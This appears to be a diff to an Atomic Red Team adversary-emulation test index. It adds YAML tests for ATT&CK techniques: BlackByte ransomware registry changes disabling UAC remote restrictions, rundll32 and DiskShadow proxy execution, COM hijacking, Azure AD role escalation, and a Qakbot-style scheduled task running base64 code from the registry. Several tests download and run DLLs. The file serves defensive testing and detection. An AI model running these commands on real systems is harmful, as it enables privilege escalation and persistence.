+          cmd.exe /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLinkedConnections /t REG_DWORD /d 1 /f
+          cmd.exe /c reg add HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v LongPathsEnabled /t REG_DWORD /d 1 /f
+        cleanup_command: |
+          reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ /v LocalAccountTokenFilterPolicy /f 2>&1
+          reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLinkedConnections /f 2>&1
+          reg delete HKLM\SYSTEM\CurrentControlSet\Control\FileSystem\ /v LongPathsEnabled /f 2>&1
+        name: command_prompt
+        elevation_required: true
+    - name: BlackByte Ransomware Registry Changes - Powershell
+      auto_generated_guid: 0b79c06f-c788-44a2-8630-d69051f1123d
+      description: |
+        This task recreates the steps taken by BlackByte ransomware before it worms to other machines via Powershell.  See "Preparing to Worm" section: https://redcanary.com/blog/blackbyte-ransomware/
+        The steps are as follows:
+        <ol>
+            <li>1. Elevate Local Privilege by disabling UAC Remote Restrictions</li>
+            <li>2. Enable OS to share network connections between different privilege levels</li>
+            <li>3. Enable long path values for file paths, names, and namespaces to ensure encryption of all file names and paths</li>
+        </ol>
+        The registry keys and their respective values will be created upon successful execution.
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name LocalAccountTokenFilterPolicy -PropertyType DWord -Value 1 -Force
+          New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLinkedConnections -PropertyType DWord -Value 1 -Force
+          New-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\FileSystem" -Name LongPathsEnabled -PropertyType DWord -Value 1 -Force
+        cleanup_command: |
+          Remove-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name LocalAccountTokenFilterPolicy -Force
+          Remove-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLinkedConnections -Force
+          Remove-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\FileSystem" -Name LongPathsEnabled -Force
+        name: powershell
+        elevation_required: true
   T1601:
     technique:
       external_references:
@@ -35958,7 +36339,65 @@ defense-evasion:
       - Linux
       - macOS
       - Windows
-    atomic_tests: []
+      identifier: T1564.006
+    atomic_tests:
+    - name: Register Portable Virtualbox
+      auto_generated_guid: c59f246a-34f8-4e4d-9276-c295ef9ba0dd
+      description: "ransomware payloads via virtual machines (VM). \n[Maze ransomware](https://threatpost.com/maze-ransomware-ragnar-locker-virtual-machine/159350/)\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        msi_file_path:
+          description: Path to the MSI file
+          type: Path
+          default: PathToAtomicsFolder\T1564.006\bin\Virtualbox_52.msi
+        cab_file_path:
+          description: Path to the CAB file
+          type: Path
+          default: PathToAtomicsFolder\T1564.006\bin\common.cab
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'MSI file must exist on disk at specified location (#{msi_file_path})
+
+'
+        prereq_command: 'if (Test-Path #{msi_file_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
+          New-Item -Type Directory (split-path #{msi_file_path}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1564.006/bin/Virtualbox_52.msi" -OutFile "#{msi_file_path}"
+      - description: 'CAB file must exist on disk at specified location (#{cab_file_path})
+
+'
+        prereq_command: 'if (Test-Path #{cab_file_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: "New-Item -Type Directory (split-path #{cab_file_path})
+          -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1564.006/bin/common.cab\"
+          -OutFile \"#{cab_file_path}\" \n"
+      - description: 'Old version of Virtualbox must be installed
+
+'
+        prereq_command: 'if (Test-Path "C:\Program Files\Oracle\VirtualBox\VboxC.dll")
+          {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'msiexec /i #{msi_file_path} /qn
+
+'
+      executor:
+        command: |
+          "C:\Program Files\Oracle\VirtualBox\VBoxSVC.exe" /reregserver
+          regsvr32 /S "C:\Program Files\Oracle\VirtualBox\VboxC.dll"
+          rundll32 "C:\Program Files\Oracle\VirtualBox\VBoxRT.dll,RTR3Init"
+          sc create VBoxDRV binpath= "C:\Program Files\Oracle\VirtualBox\drivers\VboxDrv.sys" type= kernel start= auto error= normal displayname= PortableVBoxDRV
+          sc start VBoxDRV
+        cleanup_command: |
+          sc stop VBoxDRV
+          sc delete VBoxDRV
+          regsvr32 /u /S "C:\Program Files\Oracle\VirtualBox\VboxC.dll"
+          msiexec /x #{msi_file_path} /qn
+        name: command_prompt
   T1218.011:
     technique:
       id: attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5
@@ -36204,6 +36643,98 @@ defense-evasion:
 
 '
         name: command_prompt
+    - name: Execution of non-dll using rundll32.exe
+      auto_generated_guid: ae3a8605-b26e-457c-b6b3-2702fd335bac
+      description: "Rundll32.exe running non-dll \n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        input_url:
+          description: Url to download the DLL
+          type: Url
+          default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll
+        input_file:
+          description: Non-dll file
+          type: String
+          default: C:\Users\$env:username\Downloads\calc.png
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Non-dll file must exist on disk at specified location
+
+'
+        prereq_command: 'if (Test-Path #{input_file}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Invoke-WebRequest "#{input_url}" -OutFile "#{input_file}"
+
+'
+      executor:
+        name: powershell
+        command: 'rundll32.exe #{input_file}, StartW
+
+'
+    - name: Rundll32 with Ordinal Value
+      auto_generated_guid: 9fd5a74b-ba89-482a-8a3e-a5feaa3697b0
+      description: "Rundll32.exe loading dll using ordinal value #2 to DLLRegisterServer.
+        \nUpon successful execution, Calc.exe will spawn.\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        input_url:
+          description: Url to download the DLL
+          type: Url
+          default: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.010/bin/AllTheThingsx64.dll
+        input_file:
+          description: DLL File
+          type: String
+          default: PathToAtomicsFolder\T1218.010\bin\AllTheThingsx64.dll
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'DLL file must exist on disk at specified location
+
+'
+        prereq_command: 'if (Test-Path #{input_file}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Invoke-WebRequest "#{input_url}" -OutFile "#{input_file}"
+
+'
+      executor:
+        name: command_prompt
+        command: 'rundll32.exe #{input_file},#2
+
+'
+    - name: Rundll32 with Control_RunDLL
+      auto_generated_guid: e4c04b6f-c492-4782-82c7-3bf75eb8077e
+      description: "Rundll32.exe loading dll with 'control_rundll' within the command-line,
+        loading a .cpl or another file type related to CVE-2021-40444. \n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        input_url:
+          description: Url to download the DLL
+          type: Url
+          default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll
+        input_file:
+          description: DLL File
+          type: String
+          default: PathToAtomicsFolder\T1047\bin\calc.dll
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'DLL file must exist on disk at specified location
+
+'
+        prereq_command: 'if (Test-Path #{input_file}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Invoke-WebRequest "#{input_url}" -OutFile "#{input_file}"
+
+'
+      executor:
+        name: command_prompt
+        command: 'rundll32.exe shell32.dll,Control_RunDLL #{input_file}
+
+'
   T1134.005:
     technique:
       external_references:
@@ -37121,6 +37652,43 @@ defense-evasion:
         command: 'Invoke-ATHRemoteFXvGPUDisablementCommand -ModuleName #{module_name}
           -ModulePath #{module_path}'
         name: powershell
+    - name: DiskShadow Command Execution
+      auto_generated_guid: 0e1483ba-8f0c-425d-b8c6-42736e058eaa
+      description: 'Emulates attack with a DiskShadow.exe (LOLBIN installed by default
+        on Windows) being used to execute arbitrary commands Reference: https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        txt_payload:
+          description: txt to execute
+          type: Path
+          default: PathToAtomicsFolder\T1218\src\T1218.txt
+        dspath:
+          description: Default location of DiskShadow.exe
+          type: Path
+          default: C:\Windows\System32\diskshadow.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: txt file must exist on disk at specified location (#{txt_payload})
+        prereq_command: 'if (Test-Path #{txt_payload}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
+          New-Item -Type Directory (split-path #{txt_payload}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/T1218.txt" -OutFile "#{txt_payload}"
+      - description: DiskShadow.exe must exist on disk at specified location (#{dspath})
+        prereq_command: 'if (Test-Path #{dspath}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'echo "DiskShadow.exe not found on disk at expected location"
+
+'
+      executor:
+        command: "#{dspath} -S #{txt_payload} \n"
+        name: powershell
+        elevation_required: false
   T1216:
     technique:
       id: attack-pattern--f6fe9070-7a65-49ea-ae72-76292f42cebe
@@ -40229,6 +40797,300 @@ persistence:
           aws iam remove-user-from-group --user-name #{username} --group-name #{username}
           aws iam delete-group --group-name #{username}
         name: sh
+    - name: Azure - adding user to Azure AD role
+      auto_generated_guid: 0e65ae27-5385-46b4-98ac-607a8ee82261
+      description: "The adversarie want to add user to some Azure AD role. Threat
+        actor \nmay be interested primarily in highly privileged roles, e.g. Global
+        Administrator, Application Administrator, \nPrivileged authentication administrator
+        (this role can reset Global Administrator password!).\nBy default, the role
+        Global Reader is assigned to service principal in this test.\n\nThe account
+        you use to run the PowerShell command should have Privileged Role Administrator
+        or Global Administrator role in your Azure AD.\n\nDetection hint - check Activity
+        \"Add member to role\" in Azure AD Audit Logs. In targer you will also see
+        User as a type.\n"
+      supported_platforms:
+      - azure-ad
+      input_arguments:
+        username:
+          description: Azure AD username
+          type: String
+          default: jonh@contoso.com
+        password:
+          description: Azure AD password
+          type: String
+          default: p4sswd
+        user_principal_name:
+          description: Name of the targeted user (user principal)
+          type: String
+          default: SuperUser
+        role_name:
+          description: Name of the targed Azure AD role
+          type: String
+          default: Global Reader
+      dependencies:
+      - description: 'AzureAD module must be installed.
+
+'
+        prereq_command: 'try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue)
+          {exit 0} else {exit 1}} catch {exit 1}
+
+'
+        get_prereq_command: 'Install-Module -Name AzureAD -Force
+
+'
+      executor:
+        command: |
+          Import-Module -Name AzureAD
+          $PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
+          $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
+          Connect-AzureAD -Credential $Credential
+
+          $user = Get-AzureADUser | where-object {$_.DisplayName -eq "#{user_principal_name}"}
+          if ($user -eq $null) { Write-Warning "User not found"; exit }
+          $role = Get-AzureADDirectoryRole | where-object {$_.DisplayName -eq "#{role_name}"}
+          if ($role -eq $null) { Write-Warning "Role not found"; exit }
+          Add-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $user.ObjectId
+          Write-Host "User $($user.DisplayName) was added to $($role.DisplayName) role"
+        cleanup_command: |
+          Import-Module -Name AzureAD -ErrorAction Ignore
+          $PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
+          $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
+          Connect-AzureAD -Credential $Credential -ErrorAction Ignore
+
+          $user = Get-AzureADUser | where-object {$_.DisplayName -eq "#{user_principal_name}"}
+          if ($user -eq $null) { Write-Warning "User not found"; exit }
+          $role = Get-AzureADDirectoryRole | where-object {$_.DisplayName -eq "#{role_name}"}
+          if ($role -eq $null) { Write-Warning "Role not found"; exit }
+
+          Remove-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -MemberId $user.ObjectId
+          Write-Host "User $($user.DisplayName) was removed from $($role.DisplayName) role"
+        name: powershell
+        elevation_required: false
+    - name: Azure - adding service principal to Azure AD role
+      auto_generated_guid: 92c40b3f-c406-4d1f-8d2b-c039bf5009e4
+      description: "The adversarie want to add service principal to some Azure AD
+        role. Threat actor \nmay be interested primarily in highly privileged roles,
+        e.g. Global Administrator, Application Administrator, \nPrivileged authentication
+        administrator (this role can reset Global Administrator password!).\nBy default,
+        the role Global Reader is assigned to service principal in this test.\n\nThe
+        account you use to run the PowerShell command should have Privileged Role
+        Administrator or Global Administrator role in your Azure AD.\n\nDetection
+        hint - check Activity \"Add member to role\" in Azure AD Audit Logs. In targer
+        you will also see Service Principal as a type.\n"
+      supported_platforms:
+      - azure-ad
+      input_arguments:
+        username:
+          description: Azure AD username
+          type: String
+          default: jonh@contoso.com
+        password:
+          description: Azure AD password
+          type: String
+          default: p4sswd
+        service_principal_name:
+          description: Name of the service principal
+          type: String
+          default: SuperSP
+        role_name:
+          description: Name of the targed Azure AD role
+          type: String
+          default: Global Reader
+      dependencies:
+      - description: 'AzureAD module must be installed.
+
+'
+        prereq_command: 'try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue)
+          {exit 0} else {exit 1}} catch {exit 1}
+
+'
+        get_prereq_command: 'Install-Module -Name AzureAD -Force
+
+'
+      executor:
+        command: |
+          Import-Module -Name AzureAD
+          $PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
+          $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
+          Connect-AzureAD -Credential $Credential
+
+          $sp = Get-AzureADServicePrincipal | where-object {$_.DisplayName -eq "#{service_principal_name}"}
+          if ($sp -eq $null) { Write-Warning "Service Principal not found"; exit }
+          $role = Get-AzureADDirectoryRole | where-object {$_.DisplayName -eq "#{role_name}"}
+          if ($role -eq $null) { Write-Warning "Role not found"; exit }
+          Add-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $sp.ObjectId
+          Write-Host "Service Principal $($sp.DisplayName) was added to $($role.DisplayName)"
+        cleanup_command: |
+          Import-Module -Name AzureAD -ErrorAction Ignore
+          $PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
+          $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
+          Connect-AzureAD -Credential $Credential -ErrorAction Ignore
+
+          $sp = Get-AzureADServicePrincipal | where-object {$_.DisplayName -eq "#{service_principal_name}"}
+          if ($sp -eq $null) { Write-Warning "Service Principal not found"; exit }
+          $role = Get-AzureADDirectoryRole | where-object {$_.DisplayName -eq "#{role_name}"}
+          if ($role -eq $null) { Write-Warning "Role not found"; exit }
+
+          Remove-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -MemberId $sp.ObjectId
+          Write-Host "Service Principal $($sp.DisplayName) was removed from $($role.DisplayName) role"
+        name: powershell
+        elevation_required: false
+    - name: Azure - adding user to Azure role in subscription
+      auto_generated_guid: 1a94b3fc-b080-450a-b3d8-6d9b57b472ea
+      description: "The adversarie want to add user to some Azure role, also called
+        Azure resource role. Threat actor \nmay be interested primarily in highly
+        privileged roles, e.g. Owner, Contributor.\nBy default, the role Reader is
+        assigned to user in this test.\n\nNew-AzRoleAssignment cmdlet could be also
+        use to assign user/service principal to resource, resource group and management
+        group.\n\nThe account you use to run the PowerShell command must have Microsoft.Authorization/roleAssignments/write
+        \n(e.g. such as User Access Administrator or Owner) and the Azure Active Directory
+        Graph Directory.Read.All \nand Microsoft Graph Directory.Read.All permissions.\n\nDetection
+        hint - check Operation Name \"Create role assignment\" in subscriptions Activity
+        Logs.\n"
+      supported_platforms:
+      - iaas:azure
+      input_arguments:
+        username:
+          description: Azure AD username
+          type: String
+          default: jonh@contoso.com
+        password:
+          description: Azure AD password
+          type: String
+          default: p4sswd
+        user_principal_name:
+          description: Name of the targeted user (user principal)
+          type: String
+          default: SuperUser
+        role_name:
+          description: Name of the targed Azure role
+          type: String
+          default: Reader
+        subscription:
+          description: Name of the targed subscription
+          type: String
+          default: Azure subscription 1
+      dependencies:
+      - description: 'Az.Resources module must be installed.
+
+'
+        prereq_command: 'try {if (Get-InstalledModule -Name Az.Resources -ErrorAction
+          SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
+
+'
+        get_prereq_command: 'Install-Module -Name Az.Resources -Force
+
+'
+      executor:
+        command: |
+          Import-Module -Name Az.Resources
+          $PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
+          $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
+          Connect-AzAccount -Credential $Credential
+
+          $user = Get-AzADUser | where-object {$_.DisplayName -eq "#{user_principal_name}"}
+          if ($user -eq $null) { Write-Warning "User not found"; exit }
+          $subscription = Get-AzSubscription | where-object {$_.Name -eq "#{subscription}"}
+          if ($subscription -eq $null) { Write-Warning "Subscription not found"; exit }
+          $role = Get-AzRoleDefinition | where-object {$_.Name -eq "#{role_name}"}
+          if ($role -eq $null) { Write-Warning "Role not found"; exit }
+
+          New-AzRoleAssignment -ObjectId $user.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription
+          Write-Host "User $($user.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)"
+        cleanup_command: |
+          Import-Module -Name AzureAD -ErrorAction Ignore
+          $PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
+          $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword
+          Connect-AzAccount -Credential $Credential -ErrorAction Ignore
+
+          $user = Get-AzADUser | where-object {$_.DisplayName -eq "#{user_principal_name}"}
+          if ($user -eq $null) { Write-Warning "User not found"; exit }
+          $subscription = Get-AzSubscription | where-object {$_.Name -eq "#{subscription}"}
+          if ($subscription -eq $null) { Write-Warning "Subscription not found"; exit }
+          $role = Get-AzRoleDefinition | where-object {$_.Name -eq "#{role_name}"}
+          if ($role -eq $null) { Write-Warning "Role not found"; exit }
+
+          Remove-AzRoleAssignment -ObjectId $user.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription
+          Write-Host "Service Principal $($sp.DisplayName) was removed from $($role.Name) role in subscriptions $($subscriptions.Name)"
+        name: powershell
+        elevation_required: false
+    - name: Azure - adding service principal to Azure role in subscription
+      auto_generated_guid: c8f4bc29-a151-48da-b3be-4680af56f404
+      description: "The adversarie want to add service principal to some Azure role,
+        also called Azure resource role. Threat actor \nmay be interested primarily
+        in highly privileged roles, e.g. Owner, Contributor.\nBy default, the role
+        Reader is assigned to service principal in this test.\n\nNew-AzRoleAssignment
+        cmdlet could be also use to assign user/service principal to resource, resource
+        group and management group.\n\nThe account you use to run the PowerShell command
+        must have Microsoft.Authorization/roleAssignments/write \n(e.g. such as User
+        Access Administrator or Owner) and the Azure Active Directory Graph Directory.Read.All
+        \nand Microsoft Graph Directory.Read.All permissions.\n\nDetection hint -
+        check Operation Name \"Create role assignment\" in subscriptions Activity
+        Logs.\n"
+      supported_platforms:
+      - iaas:azure
+      input_arguments:
+        username:
+          description: Azure AD username
+          type: String
+          default: jonh@contoso.com
+        password:
+          description: Azure AD password
+          type: String
+          default: p4sswd
+        service_principal_name:
+          description: Name of the service principal
+          type: String
+          default: SuperSP
+        role_name:
+          description: Name of the targed Azure role
+          type: String
+          default: Reader
+        subscription:
+          description: Name of the targed subscription
+          type: String
+          default: Azure subscription 1
+      dependencies:
+      - description: 'Az.Resources module must be installed.
+
+'
+        prereq_command: 'try {if (Get-InstalledModule -Name Az.Resources -ErrorAction
+          SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
+
+'
+        get_prereq_command: 'Install-Module -Name Az.Resources -Force
+
+'
+      executor:
+        command: "Import-Module -Name Az.Resources\n$PWord = ConvertTo-SecureString
+          -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName
+          System.Management.Automation.PSCredential -ArgumentList \"#{username}\",
+          $Pword\nConnect-AzAccount -Credential $Credential\n\n$sp = Get-AzADServicePrincipal
+          | where-object {$_.DisplayName -eq \"#{service_principal_name}\"}\nif ($sp
+          -eq $null) { Write-Warning \"Service Principal not found\"; exit }\n$subscription
+          = Get-AzSubscription | where-object {$_.Name -eq \"#{subscription}\"} \nif
+          ($subscription -eq $null) { Write-Warning \"Subscription not found\"; exit
+          }\n$role = Get-AzRoleDefinition | where-object {$_.Name -eq \"#{role_name}\"}\nif
+          ($role -eq $null) { Write-Warning \"Role not found\"; exit }\n\nNew-AzRoleAssignment
+          -ObjectId $sp.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription\nWrite-Host
+          \"Service Principal $($sp.DisplayName) was added to $($role.Name) role in
+          subscriptions $($subscriptions.Name)\"\n"
+        cleanup_command: "Import-Module -Name AzureAD -ErrorAction Ignore\n$PWord
+          = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential
+          = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList
+          \"#{username}\", $Pword\nConnect-AzAccount -Credential $Credential -ErrorAction
+          Ignore\n\n$sp = Get-AzADServicePrincipal | where-object {$_.DisplayName
+          -eq \"#{service_principal_name}\"}\nif ($sp -eq $null) { Write-Warning \"Service
+          Principal not found\"; exit }\n$subscription = Get-AzSubscription | where-object
+          {$_.Name -eq \"#{subscription}\"} \nif ($subscription -eq $null) { Write-Warning
+          \"Subscription not found\"; exit }\n$role = Get-AzRoleDefinition | where-object
+          {$_.Name -eq \"#{role_name}\"}\nif ($role -eq $null) { Write-Warning \"Role
+          not found\"; exit }\n\nRemove-AzRoleAssignment -ObjectId $sp.id -RoleDefinitionId
+          $role.id -Scope /subscriptions/$subscription\nWrite-Host \"Service Principal
+          $($sp.DisplayName) was removed from $($role.Name) role in subscriptions
+          $($subscriptions.Name)\"\n"
+        name: powershell
+        elevation_required: false
   T1547.014:
     technique:
       external_references:
@@ -42568,7 +43430,48 @@ persistence:
       - Elastic
       x_mitre_platforms:
       - Windows
-    atomic_tests: []
+      identifier: T1546.015
+    atomic_tests:
+    - name: COM Hijacking - InprocServer32
+      auto_generated_guid: 48117158-d7be-441b-bc6a-d9e36e47b52b
+      description: |-
+        This test uses PowerShell to hijack a reference to a Component Object Model by creating registry values under InprocServer32 key in the HKCU hive then calling the Class ID to be executed via rundll32.exe.
+
+        Reference: https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/
+      supported_platforms:
+      - windows
+      input_arguments:
+        clsid_threading:
+          description: Threading Model
+          type: string
+          default: Apartment
+        dllpath:
+          description: Path to the DLL.
+          type: String
+          default: "$env:TEMP\\AtomicTest.dll"
+        clsid:
+          description: Class ID to hijack.
+          type: string
+          default: "{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}"
+        clsid_description:
+          description: Description for CLSID
+          type: string
+          default: MSAA AccPropServices
+      dependency_executor_name: powershell
+      dependencies:
+      - description: DLL For testing
+        prereq_command: 'if (Test-Path #{dllpath}) {exit 0} else {exit 1}'
+        get_prereq_command: Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/AtomicTest.dll"
+          -OutFile "#{dllpath}"
+      executor:
+        command: |-
+          New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}' -Value '#{clsid_description}'
+          New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Value #{dllpath}
+          New-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType "String"
+          Start-Process -FilePath "C:\Windows\System32\RUNDLL32.EXE" -ArgumentList '-sta #{clsid}'
+        cleanup_command: Remove-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}'
+          -Recurse -ErrorAction Ignore
+        name: powershell
   T1554:
     technique:
       created: '2020-02-11T18:18:34.279Z'
@@ -48283,6 +49186,28 @@ persistence:
           >$null 2>&1
 
 '
+    - name: Scheduled Task Executing Base64 Encoded Commands From Registry
+      auto_generated_guid: e895677d-4f06-49ab-91b6-ae3742d0a2ba
+      description: "A Base64 Encoded command will be stored in the registry (ping
+        127.0.0.1) and then a scheduled task will be created.\nThe scheduled task
+        will launch powershell to decode and run the command in the rgistry daily.\nThis
+        is a persistence mechanism recently seen in use by Qakbot.  \n\n[Additiona
+        Information](https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/)\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        time:
+          description: Daily scheduled task execution time
+          type: string
+          default: 27900
+      executor:
+        command: |
+          reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f
+          schtasks.exe /Create /F /TN "ATOMIC-T1053.005" /TR "cmd /c start /min \"\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))" /sc daily /st #{time}
+        cleanup_command: |
+          schtasks /delete /tn "ATOMIC-T1053.005" /F >nul 2>&1
+          reg delete HKCU\SOFTWARE\ATOMIC-T1053.005 /F >nul 2>&1
+        name: command_prompt
   T1053:
     technique:
       id: attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9
@@ -49921,9 +50846,12 @@ persistence:
         command_to_add:
           description: Command to add to the .bash_profile file
           type: String
-          default: "/path/to/script.py"
+          default: echo "Hello from Atomic Red Team T1546.004"
       executor:
-        command: 'echo "#{command_to_add}" >> ~/.bash_profile
+        command: 'echo ''#{command_to_add}'' >> ~/.bash_profile
+
+'
+        cleanup_command: 'sed -i ''/#{command_to_add}/d'' ~/.bash_profile
 
 '
         name: sh
@@ -49939,9 +50867,12 @@ persistence:
         command_to_add:
           description: Command to add to the .bashrc file
           type: String
-          default: "/path/to/script.py"
+          default: echo "Hello from Atomic Red Team T1546.004"
       executor:
-        command: 'echo "#{command_to_add}" >> ~/.bashrc
+        command: 'echo ''#{command_to_add}'' >> ~/.bashrc
+
+'
+        cleanup_command: 'sed -i ''/#{command_to_add}/d'' ~/.bashrc
 
 '
         name: sh
@@ -51197,8 +52128,8 @@ impact:
         prereq_command: 'which_gpg=`which gpg`
 
 '
-        get_prereq_command: "(which yum && yum -y epel-release gpg)||(which apt-get
-          && DEBIAN_FRONTEND=noninteractive apt-get install -y gpg)\n"
+        get_prereq_command: "(which yum && yum -y install epel-release gpg)||(which
+          apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y gpg)\n"
       executor:
         name: bash
         elevation_required: false
@@ -51283,8 +52214,8 @@ impact:
           which_ccencrypt=`which ccencrypt`
           which_ccdecrypt=`which ccdecrypt`
           if [[ $USER == "root" ]]; then cp #{root_input_file_path} #{cped_file_path}; else cp #{user_input_file_path} #{cped_file_path}; fi
-        get_prereq_command: "(which yum && yum -y epel-release ccrypt)||(which apt-get
-          && DEBIAN_FRONTEND=noninteractive apt-get install -y ccrypt)\n"
+        get_prereq_command: "(which yum && yum -y install epel-release ccrypt)||(which
+          apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y ccrypt)\n"
       executor:
         name: bash
         elevation_required: false
@@ -53399,6 +54330,26 @@ discovery:
 
 '
         name: command_prompt
+    - name: List Safari Bookmarks on MacOS
+      auto_generated_guid: 5fc528dd-79de-47f5-8188-25572b7fafe0
+      description: 'This test searches for Safari''s Bookmarks file (on macOS) and
+        lists any found instances to a text file.
+
+'
+      supported_platforms:
+      - macos
+      input_arguments:
+        output_file:
+          description: Path where captured results will be placed.
+          type: Path
+          default: "/tmp/T1217-Safari.txt"
+      executor:
+        command: "find / -path \"*/Safari/Bookmarks.plist\" 2>/dev/null >> #{output_file}
+          \ncat #{output_file} \n"
+        cleanup_command: 'rm -f #{output_file} 2>/dev/null
+
+'
+        name: sh
   T1087.004:
     technique:
       external_references:
@@ -54842,6 +55793,16 @@ discovery:
 
 '
         name: sh
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'check if lsof exists
+
+'
+        prereq_command: 'which lsof
+
+'
+        get_prereq_command: "(which yum && yum -y install lsof)||(which apt-get &&
+          DEBIAN_FRONTEND=noninteractive apt-get install -y lsof)\n"
     - name: Show if a user account has ever logged in remotely
       auto_generated_guid: 0f0b6a29-08c3-44ad-a30b-47fd996b2110
       description: 'Show if a user account has ever logged in remotely
@@ -55198,14 +56159,32 @@ discovery:
           fi;
 
 '
-        get_prereq_command: "(which yum && yum -y epel-release nmap)||(which apt-get
-          && DEBIAN_FRONTEND=noninteractive apt-get install -y nmap)\n"
+        get_prereq_command: "(which yum && yum -y install epel-release nmap)||(which
+          apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y nmap)\n"
+      - description: 'Check if nc command exists on the machine
+
+'
+        prereq_command: 'if [ -x "$(command -v nc)" ]; then exit 0; else exit 1; fi;
+
+'
+        get_prereq_command: "(which yum && yum -y install epel-release nc)||(which
+          apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y netcat)\n"
+      - description: 'Check if telnet command exists on the machine
+
+'
+        prereq_command: 'if [ -x "$(command -v telnet)" ]; then exit 0; else exit
+          1; fi;
+
+'
+        get_prereq_command: "(which yum && yum -y install epel-release telnet)||(which
+          apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y telnet)\n"
       executor:
         command: |
